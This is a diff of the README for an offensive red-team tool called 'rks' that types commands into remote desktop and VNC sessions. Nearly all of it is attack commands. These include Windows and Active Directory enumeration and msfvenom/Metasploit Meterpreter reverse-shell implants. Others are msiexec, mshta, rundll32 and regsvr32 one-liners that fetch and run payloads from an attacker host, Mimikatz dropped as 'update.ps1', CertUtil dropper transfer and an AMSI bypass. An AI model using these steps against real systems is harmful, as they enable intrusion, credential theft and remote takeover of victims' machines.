@@ -41,8 +41,8 @@ sudo chmod 755 /usr/local/bin/rks
 ## Help Menu
 
 ```
-$ ./rks.sh -h
-Usage: ./rks.sh
+$ rks -h
+Usage: rks
 Options:
     -c, --command <command | cmdfile>   Specify a command or a file containing to execute
     -i, --input <input_file>            Specify the local input file to transfer
@@ -101,12 +101,12 @@ net localgroup Administrators
 ipconfig /all
 systeminfo
 
-$ ./rks.sh -c "cmd.exe" -m dialogbox
+$ rks -c "cmd.exe" -m dialogbox
 [*] Checking one of the lines reaches 260 character limit
 [*] Executing commands...
 [+] Task completed!
 
-$ ./rks.sh -c recon_local_enum_cmds.txt
+$ rks -c recon_local_enum_cmds.txt
 [*] Executing commands...
 [+] Task completed!
 ```
@@ -114,7 +114,7 @@ $ ./rks.sh -c recon_local_enum_cmds.txt
 - To execute a single command
 
 ```
-$ ./rks.sh -c "cmd.exe /k \"whoami /all & net user & net localgroup Administrators & ipconfig /all & systeminfo\"" -m dialogbox
+$ rks -c "cmd.exe /k \"whoami /all & net user & net localgroup Administrators & ipconfig /all & systeminfo\"" -m dialogbox
 [*] Checking one of the lines reaches 260 character limit
 [*] Executing commands...
 [+] Task completed!
@@ -128,20 +128,20 @@ net group "Domain Admins" /domain
 net group "Enterprise Admins" /domain
 net group "Domain Computers" /domain
 
-$ ./rks.sh -c "cmd.exe" -m dialogbox
+$ rks -c "cmd.exe" -m dialogbox
 [*] Checking one of the lines reaches 260 character limit
 [*] Executing commands...
 [+] Task completed!
 
-$ ./rks.sh -c recon_ad_enum_cmds.txt
+$ rks -c recon_ad_enum_cmds.txt
 [*] Executing commands...
 [+] Task completed!
 ```
 
-- To execute a single command
+To execute a single command.
 
 ```
-$ ./rks.sh -c "cmd.exe /k \"net user /domain & net group \"Domain Admins\" /domain & net group \"Enterprise Admins\" /domain & net group \"Domain Computers\" /domain\""
+$ rks -c "cmd.exe /k \"net user /domain & net group \"Domain Admins\" /domain & net group \"Enterprise Admins\" /domain & net group \"Domain Computers\" /domain\""
 [*] Checking one of the lines reaches 260 character limit
 [*] Executing commands...
 [+] Task completed!
@@ -149,53 +149,53 @@ $ ./rks.sh -c "cmd.exe /k \"net user /domain & net group \"Domain Admins\" /doma
 
 #### Powershell
 
-- Local machine enumeration (TODO)
+Local machine enumeration (TODO)
 
 ```
 $ cat recon_local_enum_cmdlets.txt
 
-$ ./rks.sh -c "powershell.exe" -m dialogbox
+$ rks -c "powershell.exe" -m dialogbox
 
-$ ./rks.sh -c recon_local_enum_cmdlets.txt
+$ rks -c recon_local_enum_cmdlets.txt
 ```
 
-- Active directory enumeration (TODO)
+Active directory enumeration (TODO)
 
 ```
 $ cat recon_ad_enum_cmdlets.txt
 
-$ ./rks.sh -c "powershell.exe" -m dialogbox
+$ rks -c "powershell.exe" -m dialogbox
 
-$ ./rks.sh -c recon_ad_enum_cmdlets.txt
+$ rks -c recon_ad_enum_cmdlets.txt
 ```
 
 ### 0x02 - Execute Implant
 
 #### Windows
 
-- Execute an implant while reading the contents of the payload in powershell.
+Execute an implant while reading the contents of the payload in powershell.
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh -o implant.ps1
 
 $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"
 
-$ ./rks.sh -c "powershell.exe" -m dialogbox
+$ rks -c "powershell.exe" -m dialogbox
 
-$ ./rks.sh -c implant.ps1
+$ rks -c implant.ps1
 ```
 
-- Execute an powershell oneliner implant using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
+Execute an powershell oneliner implant using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
 
 ```
 $ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"
 
-$ ./rks.sh -c "cmd.exe" -m dialogbox
+$ rks -c "cmd.exe" -m dialogbox
 
-$ ./rks.sh -c "powershell.exe -nop -w hidden -e <base64_payload>"
+$ rks -c "powershell.exe -nop -w hidden -e <base64_payload>"
 ```
 
-- Execute an implant with `msiexec.exe` while hosting a webserver.
+Execute an implant with `msiexec.exe` while hosting a webserver.
 
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o implant.msi
@@ -204,31 +204,31 @@ $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterp
 
 $ sudo python -m http.server 80
 
-$ ./rks.sh -c "msiexec /quiet /qn /i http://<attacker_IP>/implant.msi" -m dialogbox
+$ rks -c "msiexec /quiet /qn /i http://<attacker_IP>/implant.msi" -m dialogbox
 ```
 
-- Execute an implant with `mshta.exe` using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.
+Execute an implant with `mshta.exe` using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.
 
 ```
 $ sudo msfconsole -qx "use exploit/windows/misc/hta_server; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvhost <server_IP>; set srvport <server_PORT> exploit"
 
-$ ./rks.sh -c "mshta.exe http://<attacker_IP>:<attacker_PORT>/implant.hta" -m dialogbox
+$ rks -c "mshta.exe http://<attacker_IP>:<attacker_PORT>/implant.hta" -m dialogbox
 ```
 
-- Execute an implant with `rundll32.exe` using `metasploit-framework` exploit module `exploit/windows/smb/smb_delivery`.
+Execute an implant with `rundll32.exe` using `metasploit-framework` exploit module `exploit/windows/smb/smb_delivery`.
 
 ```
 $ sudo msfconsole -qx "use exploit/windows/smb/smb_delivery; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set file_name implant.dll; set share data; exploit"
 
-$ ./rks.sh -c "rundll32.exe \\<attacker_IP>\data\implant.dll,0" -m dialogbox
+$ rks -c "rundll32.exe \\<attacker_IP>\data\implant.dll,0" -m dialogbox
 ```
 
-- Execute an implant with `regsvr32.exe` using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
+Execute an implant with `regsvr32.exe` using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.
 
 ```
 $ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 3; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"
 
-$ ./rks.sh -c "regsvr32 /s /n /u /i://http://<attacker_IP>:<attacker_PORT>/implant.sct scrobj.dll" -m dialogbox
+$ rks -c "regsvr32 /s /n /u /i://http://<attacker_IP>:<attacker_PORT>/implant.sct scrobj.dll" -m dialogbox
 ```
 
 - MSBuild
@@ -242,12 +242,12 @@ TODO: Fill the missing info
 ```
 $ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set payload python/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"
 
-$ ./rks.sh -c "python -c \"<payload>\""
+$ rks -c "python -c \"<payload>\""
 ```
 
 ### 0x03 - File Transfer
 
-- There are 6 file transfer methods in total.
+There are 6 file transfer methods in total.
 
 |     Method     |      Platform     | Description |
 | -------------- | ----------------- | ----------- |
@@ -258,42 +258,42 @@ $ ./rks.sh -c "python -c \"<payload>\""
 |  `outfileb64`  |      Windows      | Uses `Out-File` cmdlet to output the encoded base64 file's content then decodes it with `CertUtil.exe`. |
 |    `copycon`   |      Windows      | Uses `copy con` command to output the text file. |
 
-- Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes. By default it uses Powershell base64 to transfer files if not specified. This also includes droppers even if the size is large. Bear in mind it'll take time to complete the file transfer.
+Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes. By default it uses Powershell base64 to transfer files if not specified. This also includes droppers even if the size is large. Bear in mind it'll take time to complete the file transfer.
 
 ```
-$ ./rks.sh -c "powershell.exe" -m dialogbox
+$ rks -c "powershell.exe" -m dialogbox
 
-$ ./rks.sh -i Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
+$ rks -i Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
 [*] Transferring file...
 [+] File transferred!
 ```
 
-- To transfer droppers you can use `CertUtil.exe` base64 especially if it's large.
+To transfer droppers you can use `CertUtil.exe` base64 especially if it's large.
 
 `$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=4444 -f exe -o implant.exe`
 
-- For powershell.
+For powershell.
 
 ```
-$ ./rks.sh -c "powershell.exe" -m dialogbox
+$ rks -c "powershell.exe" -m dialogbox
 
-$ ./rks.sh -i implant.exe -o implant.exe -m outfileb64
+$ rks -i implant.exe -o implant.exe -m outfileb64
 ```
 
-- It's also possible for legacy operating systems to transfer files such as, **Windows XP** that lacks powershell except for command prompt.
+It's also possible for legacy operating systems to transfer files such as, **Windows XP** that lacks powershell except for command prompt.
 
 ```
-$ ./rks.sh -c "cmd.exe" -m dialogbox
+$ rks -c "cmd.exe" -m dialogbox
 
-$ ./rks.sh -i implant.exe -o implant.exe -m cmdb64
+$ rks -i implant.exe -o implant.exe -m cmdb64
 ```
 
-- Activate your C2 listener and execute the implant
+Activate your C2 listener and execute the implant.
 
 ```
 $ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp set lhost <IP>; set lport 4444; exploit"
 
-$ ./rks.sh -c ".\implant.exe"
+$ rks -c ".\implant.exe"
 ```
 
 ### 0x04 - Privilege Escalation
@@ -315,26 +315,39 @@ $ cat amsi_bypass.ps1
 
 $ cat amsi_bypass.ps1 implant.ps1 > payload.ps1
 
-$ ./rks.sh -c "powershell.exe" -m dialogbox
+$ rks -c "powershell.exe" -m dialogbox
 
-$ ./rks.sh -c payload.ps1
+$ rks -c payload.ps1
 ```
 
 ### 0x07 - Specify Grapical Remote Software
 
 - If you're targeting VNC network protocols you can specify the window name with `tightvnc`.
 
-`$ ./rks.sh -i implant.ps1 -w tightvnc`
+```
+$ rks -i implant.ps1 -w tightvnc
+```
 
 ### 0x08 - FAQ
 
 TODO: Fill this info
 
+## Troubleshooting
+
+### Uninstall
+
+To uninstall the programs.
+
+```
+$ sudo rm -f /usr/local/bin/remotekeystrokes && \
+sudo rm -f /usr/local/bin/rks
+```
+
 ## TODO and Help Wanted
 
 - [ ] Implement Bin2Hex file transfer
 
-- [ ] Implement encryption method of base64
+- [ ] Implement encryption method of AES256 via base64
 
 - [ ] Implement a persistence function for both windows and linux.
 
